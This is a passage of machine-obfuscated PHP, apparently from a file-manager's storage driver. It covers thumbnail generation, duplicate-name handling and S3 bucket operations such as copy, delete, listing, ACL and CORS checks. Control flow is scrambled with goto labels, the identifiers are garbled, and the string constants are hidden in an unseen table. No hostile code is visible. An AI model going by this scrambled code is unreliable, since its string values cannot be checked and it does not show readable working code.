$AğŠ°ÃœáÑ[$D†°Š×¿ºï[165]] <= $c£ºê‚‚›×) { $e™¼”¤Ñ”ø = !0; } } $F“ë¼ñì = $f¼ßÓŒÁ³[$D†°Š×¿ºï[163]][$D†°Š×¿ºï[28]]; } goto DòÊ’÷µéÎ; A¼Š©º“½œ: $c·‘á†ÑÏ¶ = DATA_THUMB . $CŸ·šŸˆ¡Ñ; del_file($c·‘á†ÑÏ¶); if (!@file_exists($c·‘á†ÑÏ¶)) { $b¸è§”¨– = TEMP_FILES; if (!is_dir($b¸è§”¨–)) { mk_dir($b¸è§”¨–); } $b·éŸç¦Ú² = $b¸è§”¨– . $Aî–¶¯×Û . $D†°Š×¿ºï[94] . $f¼ßÓŒÁ³[$D†°Š×¿ºï[167]]; if (!@file_exists($b·éŸç¦Ú²)) { $b·éŸç¦Ú² = $this->download($D‹Ğ÷àï¬, $b·éŸç¦Ú²); } $FŒÆ‡º§¿Ô = new ImageThumb($b·éŸç¦Ú², $D†°Š×¿ºï[173]); $FŒÆ‡º§¿Ô->prorate($c·‘á†ÑÏ¶, $c£ºê‚‚›×, $c£ºê‚‚›× * 10); } goto C£Ò‘÷§Ş; B†… ÛŒ¦‘: $D†°Š×¿ºï =& $_SERVER[Â€Á›¨õ]; if (substr($D‹Ğ÷àï¬, 0, 4) == $D†°Š×¿ºï[146]) { $this->fileOutLink($D‹Ğ÷àï¬); } $f¼ßÓŒÁ³ = $this->info($D‹Ğ÷àï¬); goto f½¤„×½ù; C£Ò‘÷§Ş: if (!file_exists($c·‘á†ÑÏ¶) || filesize($c·‘á†ÑÏ¶) < 100) { return @file_exists($b·éŸç¦Ú²) ? IO::fileOut($b·éŸç¦Ú²) : $this->fileOut($D‹Ğ÷àï¬); } if (!($EÀ†‘Šˆ ¥ = IO::move($c·‘á†ÑÏ¶, $b–ô‰›Ï))) { return IO::fileOut($c·‘á†ÑÏ¶); } del_file($c·‘á†ÑÏ¶); goto FÅ¯’²À’; Eâ£˜¯Ï™: if (!($Fƒ½ÑÂµ°ì = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $D†°Š×¿ºï[171]))) { $b–ô‰›Ï = IO::mkdir(IO_PATH_SYSTEM_TEMP . $D†°Š×¿ºï[172]); } else { $b–ô‰›Ï = KodIO::make($Fƒ½ÑÂµ°ì); } if ($Fƒ½ÑÂµ°ì = IO::fileNameExist($b–ô‰›Ï, $CŸ·šŸˆ¡Ñ)) { $c·‘á†ÑÏ¶ = KodIO::make($Fƒ½ÑÂµ°ì); return IO::fileOut($c·‘á†ÑÏ¶, !1, $F“ë¼ñì); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto A¼Š©º“½œ; FÄøÄšƒÌ‘: } public function fileOutImageServer($C©Ó÷Üİï², $Bİ‹¶‘éÅ = 250) { $this->fileOutImage($C©Ó÷Üİï², $Bİ‹¶‘éÅ); } public function fileNameAuto($dÕƒáÏäãˆ, $f£¹²Éí˜, $A¼òöˆÓèß = REPEAT_RENAME, $d¼‰›ïÒÑ“ = false) { goto CÏ¯× “‘Á; CÏ¯× “‘Á: $EŒÌ–¤‚‡ =& $_SERVER[Â€Á›¨õ]; $Aêší÷¹ = $dÕƒáÏäãˆ === $EŒÌ–¤‚‡[33] ? $f£¹²Éí˜ : rtrim($dÕƒáÏäãˆ, $EŒÌ–¤‚‡[8]) . $EŒÌ–¤‚‡[8] . $f£¹²Éí˜; if ($A¼òöˆÓèß == REPEAT_REPLACE || !$this->exist($Aêší÷¹) || $d¼‰›ïÒÑ“ && $A¼òöˆÓèß != REPEAT_RENAME_FOLDER) { return $f£¹²Éí˜; } goto a„Ä˜çæ†‡; f¥Ûì‡¸ğ: $D¡”™ÆÁ†Ã = 1; $Dİù‚®Øª = substr($f£¹²Éí˜, 0, strlen($f£¹²Éí˜) - strlen($FÔÊôóİ )); $A¾ë‡¢Óºî = $Dİù‚®Øª . "\50{$D¡”™ÆÁ†Ã}\x29{$FÔÊôóİ }"; goto B‚ÆºèíŞ; a„Ä˜çæ†‡: if ($A¼òöˆÓèß == REPEAT_SKIP) { return !1; } $FÔÊôóİ  = $EŒÌ–¤‚‡[94] . get_path_ext($f£¹²Éí˜); $FÔÊôóİ  = $FÔÊôóİ  == $EŒÌ–¤‚‡[94] || $d¼‰›ïÒÑ“ ? $EŒÌ–¤‚‡[33] : $FÔÊôóİ ; goto f¥Ûì‡¸ğ; B‚ÆºèíŞ: while ($this->exist(rtrim($dÕƒáÏäãˆ, $EŒÌ–¤‚‡[8]) . $EŒÌ–¤‚‡[8] . $A¾ë‡¢Óºî)) { $A¾ë‡¢Óºî = $Dİù‚®Øª . "\50{$D¡”™ÆÁ†Ã}\51{$FÔÊôóİ }"; $D¡”™ÆÁ†Ã++; } return $A¾ë‡¢Óºî; goto c…ÊÈ’Ù—Ô; c…ÊÈ’Ù—Ô: } private function fileNameAutoList($C¸Ã™Éïî“, $dãšëóÍ¿, $cÀË›ëÕ = false) { goto aó²Â™ã¾È; Eš³»¦šËˆ: $Aí†™ñ¢  = array_to_keyvalue($aä¥Ù«“§à, $Dµ•‘ö—ìì[33], $Dµ•‘ö—ìì[28]); $dÈè²°ÕÖ = $Dµ•‘ö—ìì[94] . get_path_ext($dãšëóÍ¿); $dÈè²°ÕÖ = $dÈè²°ÕÖ == $Dµ•‘ö—ìì[94] || $cÀË›ëÕ ? $Dµ•‘ö—ìì[33] : $dÈè²°ÕÖ; goto Fº÷Ä×Äğ¿; aó²Â™ã¾È: $Dµ•‘ö—ìì =& $_SERVER[Â€Á›¨õ]; $aä¥Ù«“§à = $this->listPath($C¸Ã™Éïî“, !0); $aä¥Ù«“§à = array_merge($aä¥Ù«“§à[$Dµ•‘ö—ìì[74]], $aä¥Ù«“§à[$Dµ•‘ö—ìì[73]]); goto Eš³»¦šËˆ; Bì£¥Ìùò: return $b‹ØÑùÙÁˆ; goto f ÒäÎòÑĞ; Fº÷Ä×Äğ¿: $D¢ÜˆëÚ¿Ø = substr($dãšëóÍ¿, 0, strlen($dãšëóÍ¿) - strlen($dÈè²°ÕÖ)); $b‹ØÑùÙÁˆ = $D¢ÜˆëÚ¿Ø . "\x28\x30\x29{$dÈè²°ÕÖ}"; for ($B¨ÍĞ´ß÷¶ = 1; $B¨ÍĞ´ß÷¶ <= count($Aí†™ñ¢ ) + 1; $B¨ÍĞ´ß÷¶++) { $b‹ØÑùÙÁˆ = $D¢ÜˆëÚ¿Ø . "\x28{$B¨ÍĞ´ß÷¶}\x29{$dÈè²°ÕÖ}"; if (!in_array_not_case($b‹ØÑùÙÁˆ, $Aí†™ñ¢ )) { return $b‹ØÑùÙÁˆ; } } goto Bì£¥Ìùò; f ÒäÎòÑĞ: } public function listAllFiles($Aæ…–£µè†, $cè»¦Ì…Â‚, $dÜ…£¿—ğ = array()) { goto BÄÑµ É‚å; B—£–µÑ¨„: $Aæ…–£µè† = trim($Aæ…–£µè†, $fŒ»òµîŠó[8]); foreach ($cè»¦Ì…Â‚ as $d£è¶‘ĞâØ) { $F’Ì‹ƒ½£ = ltrim(substr(trim($d£è¶‘ĞâØ, $fŒ»òµîŠó[8]), strlen($Aæ…–£µè†)), $fŒ»òµîŠó[8]); $Bì¿ä–±¶Ë = array_merge($Bì¿ä–±¶Ë, $this->slicePath($F’Ì‹ƒ½£)); } $fµ¾–«ìæ¤ = array(); goto F”³š³Â; F”³š³Â: foreach (array_unique($Bì¿ä–±¶Ë) as $d£è¶‘ĞâØ) { $f½‘ôÔÀÛÔ = array($fŒ»òµîŠó[75] => $this->getPathOuter($fŒ»òµîŠó[8] . $Aæ…–£µè† . $fŒ»òµîŠó[8] . $d£è¶‘ĞâØ), $fŒ»òµîŠó[76] => 1, $fŒ»òµîŠó[77] => 0); if (substr($d£è¶‘ĞâØ, -1) != $fŒ»òµîŠó[8]) { $f½‘ôÔÀÛÔ[$fŒ»òµîŠó[76]] = 0; $a¿ÚÌé“Í = $this->getPath($Aæ…–£µè† . $fŒ»òµîŠó[8] . $d£è¶‘ĞâØ); $f½‘ôÔÀÛÔ[$fŒ»òµîŠó[77]] = isset($dÜ…£¿—ğ[$a¿ÚÌé“Í]) ? $dÜ…£¿—ğ[$a¿ÚÌé“Í] : $this->size($a¿ÚÌé“Í); } $fµ¾–«ìæ¤[] = $f½‘ôÔÀÛÔ; } return $fµ¾–«ìæ¤; goto C‹ö‘ÔÔ¤; BÄÑµ É‚å: $fŒ»òµîŠó =& $_SERVER[Â€Á›¨õ]; if (empty($cè»¦Ì…Â‚)) { return array(); } $Bì¿ä–±¶Ë = array(); goto B—£–µÑ¨„; C‹ö‘ÔÔ¤: } public function slicePath($ağ½¼Ğæ) { $Fò…³ƒÂ½é =& $_SERVER[Â€Á›¨õ]; $aàœù‹§šè = explode($Fò…³ƒÂ½é[8], trim($ağ½¼Ğæ, $Fò…³ƒÂ½é[8])); $b†Á‹«¦åß = 0; do { ++$b†Á‹«¦åß; $eºê¤›‹Ñ£[] = implode($Fò…³ƒÂ½é[8], array_slice($aàœù‹§šè, 0, $b†Á‹«¦åß)) . $Fò…³ƒÂ½é[8]; } while ($b†Á‹«¦åß < count($aàœù‹§šè)); $eºê¤›‹Ñ£[count($aàœù‹§šè) - 1] = $ağ½¼Ğæ; return $eºê¤›‹Ñ£; } public function getHost() { $dïì¯ Ã÷… =& $_SERVER[Â€Á›¨õ]; $Dº±ÔÂÌš = parse_url(trim($this->domain, $dïì¯ Ã÷…[8])); $CëóïŞªˆ = isset($Dº±ÔÂÌš[$dïì¯ Ã÷…[174]]) ? $Dº±ÔÂÌš[$dïì¯ Ã÷…[174]] : http_type(); $EŠÛ¶óÜš = isset($Dº±ÔÂÌš[$dïì¯ Ã÷…[175]]) ? $Dº±ÔÂÌš[$dïì¯ Ã÷…[175]] : $Dº±ÔÂÌš[$dïì¯ Ã÷…[75]]; if (isset($Dº±ÔÂÌš[$dïì¯ Ã÷…[176]])) { $EŠÛ¶óÜš .= $dïì¯ Ã÷…[4] . $Dº±ÔÂÌš[$dïì¯ Ã÷…[176]]; } return $CëóïŞªˆ . $dïì¯ Ã÷…[177] . $EŠÛ¶óÜš; } public function pathEncode($D±÷©íƒ») { $b‘ˆ©‚¬…³ =& $_SERVER[Â€Á›¨õ]; return str_replace($b‘ˆ©‚¬…³[178], $b‘ˆ©‚¬…³[8], rawurlencode($D±÷©íƒ»)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($dÊä‘æªí) { set_timeout(); require_once SDK_DIR . $_SERVER[Â€Á›¨õ][179]; parent::__construct(); $this->_init($dÊä‘æªí); } public function _init($d¢îğ©¾¾ï) { foreach ($d¢îğ©¾¾ï as $EŞÒ§´¥õ => $DÚ¡ôëÛã) { if (isset($this->{$EŞÒ§´¥õ})) { $this->{$EŞÒ§´¥õ} = $DÚ¡ôëÛã; } } $this->endpoint = $d¢îğ©¾¾ï[$_SERVER[Â€Á›¨õ][180]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($CÂœ’¨“™ù = "\166\x34") { $this->signVer = $CÂœ’¨“™ù; $this->client->setSignatureVersion($CÂœ’¨“™ù); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto dö¥‚¶ÆçÁ; dö¥‚¶ÆçÁ: $CŞòƒíŒã¶ =& $_SERVER[Â€Á›¨õ]; $C£š¨©’­« = $this->getBucketCors(); if (!$C£š¨©’­« || !is_array($C£š¨©’­«)) { return !1; } goto DåŒÇ÷º³; DåŒÇ÷º³: if ($C£š¨©’­«[$CŞòƒíŒã¶[181]] != $CŞòƒíŒã¶[182] || $C£š¨©’­«[$CŞòƒíŒã¶[183]] != $CŞòƒíŒã¶[182]) { return !1; } $AŞ³°¶°Ù = array_map($CŞòƒíŒã¶[184], $C£š¨©’­«[$CŞòƒíŒã¶[185]]); if (!is_array($AŞ³°¶°Ù)) { $AŞ³°¶°Ù = array(); } goto AçÂïµçì…; AçÂïµçì…: $cÖ‡…áÆ• = array($CŞòƒíŒã¶[186], $CŞòƒíŒã¶[187], $CŞòƒíŒã¶[188], $CŞòƒíŒã¶[189], $CŞòƒíŒã¶[190]); $b¸Ñï‘Èø³ = array_diff($cÖ‡…áÆ•, $AŞ³°¶°Ù); return empty($b¸Ñï‘Èø³); goto CåªÈ¾êï¤; CåªÈ¾êï¤: } public function mkfile($b¹„×à‹ï, $CÍØ·ÇÙ¹ = '', $DÓó™øà¾• = REPEAT_RENAME) { $CŞ…ˆº½— = $this->setContent($b¹„×à‹ï, $CÍØ·ÇÙ¹); if ($CŞ…ˆº½— !== !1) { return $this->getPathOuter($b¹„×à‹ï); } return !1; } public function mkdir($FœÖ‰àñŠ—, $A¡Í¤àÙ™Â = REPEAT_SKIP) { if (empty($FœÖ‰àñŠ—)) { return !1; } if ($this->_isFolder($FœÖ‰àñŠ—)) { return $this->getPathOuter($FœÖ‰àñŠ—); } $f’‚¨ª™ğ = $this->setContent($FœÖ‰àñŠ—, $_SERVER[Â€Á›¨õ][33], !0); if ($f’‚¨ª™ğ !== !1) { return $this->getPathOuter($FœÖ‰àñŠ—); } return !1; } public function copyFile($AåÜËİ¿„Ù, $fô«”­¾³, $Fİå¸Íêİ² = array()) { $B©öÒÂô‹Œ =& $_SERVER[Â€Á›¨õ]; $eÒ…ÑøÉ©Ú = $this->objectMeta($AåÜËİ¿„Ù); if (!$eÒ…ÑøÉ©Ú) { return !1; } if ($eÒ…ÑøÉ©Ú[$B©öÒÂô‹Œ[77]] <= 1024 * 1024 * 200) { $E«È­™‘Ùæ = $this->client->copyObject($this->bucket, $AåÜËİ¿„Ù, $this->bucket, $fô«”­¾³, $B©öÒÂô‹Œ[191], $Fİå¸Íêİ²); } else { $E«È­™‘Ùæ = $this->client->multiCopyObject($this->bucket, $AåÜËİ¿„Ù, $this->bucket, $fô«”­¾³, $Fİå¸Íêİ²); } $E«È­™‘Ùæ = $E«È­™‘Ùæ ? $this->getPathOuter($fô«”­¾³) : !1; return $E«È­™‘Ùæ; } public function moveFile($bšƒ„‹¦ãÙ, $c¡–•×¡È) { if ($this->copyFile($bšƒ„‹¦ãÙ, $c¡–•×¡È)) { $this->delFile($bšƒ„‹¦ãÙ); return $this->getPathOuter($c¡–•×¡È); } return !1; } public function delFile($D¹Î¡„Æƒ°) { return $this->client->deleteObject($this->bucket, $D¹Î¡„Æƒ°); } public function delFolder($a·÷‘Æ•Í) { goto FÊ´¡è†„ä; a†Çì£ÈÉå: if (!empty($a·÷‘Æ•Í) && !in_array($dç•¼œ±Ó, $cèîÀ‰‘ö[$f‹‡ÒæâÇ[74]])) { $cèîÀ‰‘ö[$f‹‡ÒæâÇ[74]][] = $dç•¼œ±Ó; } $e¤ŒÃÄĞøœ = $this->delByBatch($cèîÀ‰‘ö[$f‹‡ÒæâÇ[73]]); if (!$e¤ŒÃÄĞøœ) { return !1; } goto FóŞ¤æÉİ; aó™‰¬Ì‰: $cèîÀ‰‘ö = $this->fileList($a·÷‘Æ•Í); $this->listItemCache = !0; $dç•¼œ±Ó = trim($a·÷‘Æ•Í, $f‹‡ÒæâÇ[8]) . $f‹‡ÒæâÇ[8]; goto a†Çì£ÈÉå; FóŞ¤æÉİ: return $this->delByBatch($cèîÀ‰‘ö[$f‹‡ÒæâÇ[74]]); goto aîËÆâ•‹´; FÊ´¡è†„ä: $f‹‡ÒæâÇ =& $_SERVER[Â€Á›¨õ]; if (!$this->exist($a·÷‘Æ•Í)) { return !0; } $this->listItemCache = !1; goto aó™‰¬Ì‰; aîËÆâ•‹´: } private function delByBatch($aƒ—Æ¶ß’£) { foreach (array_chunk($aƒ—Æ¶ß’£, 1000) as $BÏ×¶íãˆ) { $c°âÊğÉ«‚ = $this->client->deleteObjects($this->bucket, $BÏ×¶íãˆ); if (!$c°âÊğÉ«‚) { return !1; } } return !0; } public function rename($eÎŠ„ïĞ¾Õ, $cšå¹¶Æ) { return $this->renameObject($eÎŠ„ïĞ¾Õ, $cšå¹¶Æ); } public function listPath($CŒ‘Úä¦…, $aâ„ƒíİˆ± = false) { $BŸ•»†í† =& $_SERVER[Â€Á›¨õ]; $aìÖ¤ˆÊ£ = $this->fileList($CŒ‘Úä¦…, $BŸ•»†í†[8], !0); foreach ($aìÖ¤ˆÊ£[$BŸ•»†í†[74]] as $Dä ğƒŒĞª => $b¿Ç††Î¦) { $aìÖ¤ˆÊ£[$BŸ•»†í†[74]][$Dä ğƒŒĞª] = $this->folderInfo($b¿Ç††Î¦, $aâ„ƒíİˆ±); } foreach ($aìÖ¤ˆÊ£[$BŸ•»†í†[73]] as $Dä ğƒŒĞª => $b¿Ç††Î¦) { $aìÖ¤ˆÊ£[$BŸ•»†í†[73]][$Dä ğƒŒĞª] = $this->fileInfo($b¿Ç††Î¦[$BŸ•»†í†[28]], $aâ„ƒíİˆ±, $b¿Ç††Î¦); } return $aìÖ¤ˆÊ£; } private function fileInfo($bÍæ¹Ğ§”Î, $f¯¾”‰¬Õ« = false, $EÌå«Õ•‡÷ = array()) { goto FµÜå‚ˆ‚Š; FµÜå‚ˆ‚Š: $F×ÖÒ™­™ =& $_SERVER[Â€Á›¨õ]; $FˆÛšŒ¥ªÈ = array($F×ÖÒ™­™[28] => $this->pathThis($bÍæ¹Ğ§”Î), $F×ÖÒ™­™[75] => $this->getPathOuter($bÍæ¹Ğ§”Î), $F×ÖÒ™­™[29] => $F×ÖÒ™­™[173], $F×ÖÒ™­™[167] => $this->ext($bÍæ¹Ğ§”Î), $F×ÖÒ™­™[77] => isset($EÌå«Õ•‡÷[$F×ÖÒ™­™[77]]) ? $EÌå«Õ•‡÷[$F×ÖÒ™­™[77]] : 0); if ($f¯¾”‰¬Õ«) { return $FˆÛšŒ¥ªÈ; } goto f¼ÌĞ²ÇÓ; f¼ÌĞ²ÇÓ: $FˆÛšŒ¥ªÈ[$F×ÖÒ™­™[192]] = $FˆÛšŒ¥ªÈ[$F×ÖÒ™­™[83]] = 0; $FˆÛšŒ¥ªÈ[$F×ÖÒ™­™[193]] = $FˆÛšŒ¥ªÈ[$F×ÖÒ™­™[194]] = !0; if (empty($EÌå«Õ•‡÷)) { $EÌå«Õ•‡÷ = $this->objectMeta($bÍæ¹Ğ§”Î); if (!$EÌå«Õ•‡÷) { return $FˆÛšŒ¥ªÈ; } } goto a½Ç‡ïÎÌÂ; a½Ç‡ïÎÌÂ: if (isset($EÌå«Õ•‡÷[$F×ÖÒ™­™[195]])) { $FˆÛšŒ¥ªÈ[$F×ÖÒ™­™[83]] = $EÌå«Õ•‡÷[$F×ÖÒ™­™[195]]; } if (isset($EÌå«Õ•‡÷[$F×ÖÒ™­™[77]])) { $FˆÛšŒ¥ªÈ[$F×ÖÒ™­™[77]] = $EÌå«Õ•‡÷[$F×ÖÒ™­™[77]]; } return $FˆÛšŒ¥ªÈ; goto e„è½—†; e„è½—†: } private function folderInfo($eØ‰İ½——, $Eîİì¨¿ÂÊ = false) { goto F¹ÑâœÀÄ; EØŠ•çÏ×: $a‡›ëÉ±„†[$BËÊ£·‘–„[192]] = $a‡›ëÉ±„†[$BËÊ£·‘–„[83]] = 0; $a‡›ëÉ±„†[$BËÊ£·‘–„[193]] = $a‡›ëÉ±„†[$BËÊ£·‘–„[194]] = !0; if ($eØ‰İ½—— == $BËÊ£·‘–„[33]) { return $a‡›ëÉ±„†; } goto a“ÕÃ¹‰×; C’ÈßİÒÖ‘: return $a‡›ëÉ±„†; goto cÍËˆ¼ˆ÷; a“ÕÃ¹‰×: $eØ‰İ½—— = trim($eØ‰İ½——, $BËÊ£·‘–„[8]) . $BËÊ£·‘–„[8]; $AÕáŞñõ‚® = $this->objectMeta($eØ‰İ½——); if (isset($AÕáŞñõ‚®[$BËÊ£·‘–„[195]])) { $a‡›ëÉ±„†[$BËÊ£·‘–„[192]] = $AÕáŞñõ‚®[$BËÊ£·‘–„[195]]; } goto C’ÈßİÒÖ‘; F¹ÑâœÀÄ: $BËÊ£·‘–„ =& $_SERVER[Â€Á›¨õ]; $a‡›ëÉ±„† = array($BËÊ£·‘–„[28] => $this->pathThis($eØ‰İ½——), $BËÊ£·‘–„[75] => $this->getPathOuter($BËÊ£·‘–„[8] . $eØ‰İ½——), $BËÊ£·‘–„[29] => $BËÊ£·‘–„[76]); if ($Eîİì¨¿ÂÊ) { return $a‡›ëÉ±„†; } goto EØŠ•çÏ×; cÍËˆ¼ˆ÷: } private function fileList($føÅ±¡Ú…, $fïÔ…¯ÜÜí = '', $E³¡ªÜ³š° = 0) { goto C‘åèÓ¼´¯; eõéÑÂÇÃ: if (!$FÂÓÏÈÜá‡) { return array($Aå©ğìİÖø[74] => array(), $Aå©ğìİÖø[73] => array()); } $a“™§Š‘£Ú = $this->listItemCache === !1 ? !1 : !0; $cõŒÅ”ÃÏ¥ = $eÏÁ³Ò‘ = array(); goto fš‰•Œ½á×; C‘åèÓ¼´¯: $Aå©ğìİÖø =& $_SERVER[Â€Á›¨õ]; $dÕÏƒµØ˜º = rtrim($føÅ±¡Ú…, $Aå©ğìİÖø[8]) . $Aå©ğìİÖø[8]; $FÂÓÏÈÜá‡ = $this->listObjs($dÕÏƒµØ˜º, null, null, $fïÔ…¯ÜÜí); goto eõéÑÂÇÃ; fš‰•Œ½á×: foreach ($FÂÓÏÈÜá‡[$Aå©ğìİÖø[196]] as $A¡˜½è¾Ä ) { goto eâŒöˆáíË; cÖß÷Û¶ËÏ: $AÈîïåŠèÏ = $CÚåÒÇÁÙí == 0 && substr($AÏ˜ã±‡, strlen($AÏ˜ã±‡) - 1, 1) == $Aå©ğìİÖø[8] ? !0 : !1; if ($a“™§Š‘£Ú) { $this->cacheMethod($Aå©ğìİÖø[197], $AÏ˜ã±‡, $AÈîïåŠèÏ); $this->cacheMethod($Aå©ğìİÖø[198], $AÏ˜ã±‡, $A¡˜½è¾Ä ); } if ($AÈîïåŠèÏ) { $cõŒÅ”ÃÏ¥[] = $AÏ˜ã±‡; continue; } goto Dêì¤àë¸; eâŒöˆáíË: $AÏ˜ã±‡ = $A¡˜½è¾Ä [$Aå©ğìİÖø[28]]; if ($AÏ˜ã±‡ == $dÕÏƒµØ˜º) { continue; } $CÚåÒÇÁÙí = isset($A¡˜½è¾Ä [$Aå©ğìİÖø[77]]) ? $A¡˜½è¾Ä [$Aå©ğìİÖø[77]] : 0; goto cÖß÷Û¶ËÏ; Dêì¤àë¸: $eÏÁ³Ò‘[] = $E³¡ªÜ³š° ? $A¡˜½è¾Ä  : $AÏ˜ã±‡; goto E—´ïÆ´â®; E—´ïÆ´â®: } foreach ($FÂÓÏÈÜá‡[$Aå©ğìİÖø[199]] as $A¡˜½è¾Ä ) { $cõŒÅ”ÃÏ¥[] = $A¡˜½è¾Ä [$Aå©ğìİÖø[28]]; if ($a“™§Š‘£Ú) { $this->cacheMethod($Aå©ğìİÖø[197], $A¡˜½è¾Ä [$Aå©ğìİÖø[28]], !0); } } if ($a“™§Š‘£Ú) { $this->cacheMethod($Aå©ğìİÖø[197], $føÅ±¡Ú…, !0); } goto DéôÄêëÑ; DéôÄêëÑ: return array($Aå©ğìİÖø[74] => $cõŒÅ”ÃÏ¥, $Aå©ğìİÖø[73] => $eÏÁ³Ò‘); goto F¿ãİÙÉ­Æ; F¿ãİÙÉ­Æ: } private function listObjs($dğº×çÓêØ, $AöØ™È™ß¡ = null, $e­í¼ê»¦½ = null, $CêÈß·´óò = null) { $bŒŠ„°ââ =& $_SERVER[Â€Á›¨õ]; $dğº×çÓêØ = trim($dğº×çÓêØ, $bŒŠ„°ââ[8]); $fçö‹ÒÁÍ„ = empty($dğº×çÓêØ) ? $bŒŠ„°ââ[33] : $dğº×çÓêØ . $bŒŠ„°ââ[8]; return $this->client->getBucket($this->bucket, $fçö‹ÒÁÍ„, $AöØ™È™ß¡, $e­í¼ê»¦½, $CêÈß·´óò, !0); } public function has($cË®Á°¼ÌÚ, $BÛØó¦‰’ê = false, $F’¼‰î´õ = true) { goto a§ºœó¨; C«¹”Ù: return !1; goto b®¾Ü¤‚šœ; E´¢òïÄ¾: $f‘âÉŞ‰›ì = null; $d¨…¾ì¶¢ = 500; $F¼‰­•ÑÑ¡ = $A¯…éì†ìè[8]; goto f Ÿ¿¾†à±; f Ÿ¿¾†à±: $DŠº»¦¬Œ± = $eÖÚ¬šÁ¡ = array(); while (!0) { $d·½î¬µ¨ = $this->listObjs($cË®Á°¼ÌÚ, $f‘âÉŞ‰›ì, $d¨…¾ì¶¢, $F¼‰­•ÑÑ¡); if (!$d·½î¬µ¨) { break; } $f‘âÉŞ‰›ì = $d·½î¬µ¨[$A¯…éì†ìè[200]]; $F¥¢ì¬¡æç = $d·½î¬µ¨[$A¯…éì†ìè[196]]; $BÔñÂÑ­ = $d·½î¬µ¨[$A¯…éì†ìè[199]]; if (empty($F¥¢ì¬¡æç) && empty($BÔñÂÑ­)) { break; } if (count($F¥¢ì¬¡æç) == 1 && $F¥¢ì¬¡æç[0][$A¯…éì†ìè[28]] == $F‚¯±¿¬…) { break; } if ($BÛØó¦‰’ê) { if (count($F¥¢ì¬¡æç)) { $F¥¢ì¬¡æç = array_column($F¥¢ì¬¡æç, $A¯…éì†ìè[28]); $DŠº»¦¬Œ± = array_merge($DŠº»¦¬Œ±, $F¥¢ì¬¡æç); } if (count($BÔñÂÑ­)) { $BÔñÂÑ­ = array_column($BÔñÂÑ­, $A¯…éì†ìè[28]); $eÖÚ¬šÁ¡ = array_merge($eÖÚ¬šÁ¡, $BÔñÂÑ­); } if ($f‘âÉŞ‰›ì === null) { break; } continue; } if ($F’¼‰î´õ) { if (!empty($F¥¢ì¬¡æç)) { if (count($F¥¢ì¬¡æç) > 1 || isset($F¥¢ì¬¡æç[0][$A¯…éì†ìè[28]]) && $F¥¢ì¬¡æç[0][$A¯…éì†ìè[28]] != $F‚¯±¿¬…) { return !0; } } } else { if (!empty($BÔñÂÑ­)) { return !0; } } if ($f‘âÉŞ‰›ì === null) { break; } } if ($BÛØó¦‰’ê) { $DŠº»¦¬Œ± = array_diff($DŠº»¦¬Œ±, array($F‚¯±¿¬…)); $DŠº»¦¬Œ± = count(array_unique($DŠº»¦¬Œ±)); $eÖÚ¬šÁ¡ = count(array_unique($eÖÚ¬šÁ¡)); return array($A¯…éì†ìè[201] => $DŠº»¦¬Œ±, $A¯…éì†ìè[202] => $eÖÚ¬šÁ¡); } goto C«¹”Ù; a§ºœó¨: $A¯…éì†ìè =& $_SERVER[Â€Á›¨õ]; $cË®Á°¼ÌÚ = trim($cË®Á°¼ÌÚ, $A¯…éì†ìè[8]); $F‚¯±¿¬… = empty($cË®Á°¼ÌÚ) ? $A¯…éì†ìè[33] : $cË®Á°¼ÌÚ . $A¯…éì†ìè[8]; goto E´¢òïÄ¾; b®¾Ü¤‚šœ: } public function listAll($A±¶ì†¸°è) { $DˆÜ´“›™… =& $_SERVER[Â€Á›¨õ]; $Eò÷ÑöÄ«ª = $this->fileList($A±¶ì†¸°è, $DˆÜ´“›™…[33], !0); $a›Æƒ‡ê è = array(); foreach ($Eò÷ÑöÄ«ª[$DˆÜ´“›™…[73]] as $bè£á°Ñ¬•) { $a›Æƒ‡ê è[$bè£á°Ñ¬•[$DˆÜ´“›™…[28]]] = $bè£á°Ñ¬•[$DˆÜ´“›™…[77]]; } foreach ($Eò÷ÑöÄ«ª[$DˆÜ´“›™…[74]] as $bè£á°Ñ¬•) { if (is_string($bè£á°Ñ¬•)) { $a›Æƒ‡ê è[$bè£á°Ñ¬•] = 0; } } return $this->listAllFiles($A±¶ì†¸°è, array_keys($a›Æƒ‡ê è), $a›Æƒ‡ê è); } public function canRead($fÏ¹¤øòøœ) { $c»ìÁŸ¬á¥ =& $_SERVER[Â€Á›¨õ]; $F¹é”Áì¸Ò = $this->client->getAccessControlPolicy($this->bucket, $fÏ¹¤øòøœ); if (!$F¹é”Áì¸Ò) { return !1; } return in_array($F¹é”Áì¸Ò, array($c»ìÁŸ¬á¥[203], $c»ìÁŸ¬á¥[204], $c»ìÁŸ¬á¥[205])) ? !0 : !1; } public function canWrite($EÀÀá‰™) { $b´½ø“†³í =& $_SERVER[Â€Á›¨õ]; $DäÇªÏ±–Š = $this->client->getAccessControlPolicy($this->bucket, $EÀÀá‰™); if (!$DäÇªÏ±–Š) { return !1; } return in_array($DäÇªÏ±–Š, array($b´½ø“†³í[203], $b´½ø“†³í[204])) ? !0 : !1; } public function getContent($BŠ´„…ˆ‹Á) { return $this->client->getObject($this->bucket, $BŠ´„…ˆ‹Á); } public function setContent($eß‹ƒÃ¨, $d•º‚½†Ÿ = '', $AªäÑ£ˆµ = false) { goto Aö êñË¼; Bßå¼Åñ…: $cÃñé¬ê¡ = $this->client->putObject($d•º‚½†Ÿ, $this->bucket, $eß‹ƒÃ¨, $Cíˆ–ÁáÍ¡[191], array(), $f¶™Ìƒ´¡ò); if (!$cÃñé¬ê¡) { return !1; } if ($AªäÑ£ˆµ) { return !0; } goto DÉ›ˆËàÂ¤; DÉ›ˆËàÂ¤: $this->cacheMethod(null, null); $cÃñé¬ê¡ = $this->copyFile($eß‹ƒÃ¨, $eß‹ƒÃ¨, array($Cíˆ–ÁáÍ¡[206] => $cÃñé¬ê¡[$Cíˆ–ÁáÍ¡[207]])); return $cÃñé¬ê¡ ? !0 : !1; goto dŠ‡çƒÃ‹; Aö êñË¼: 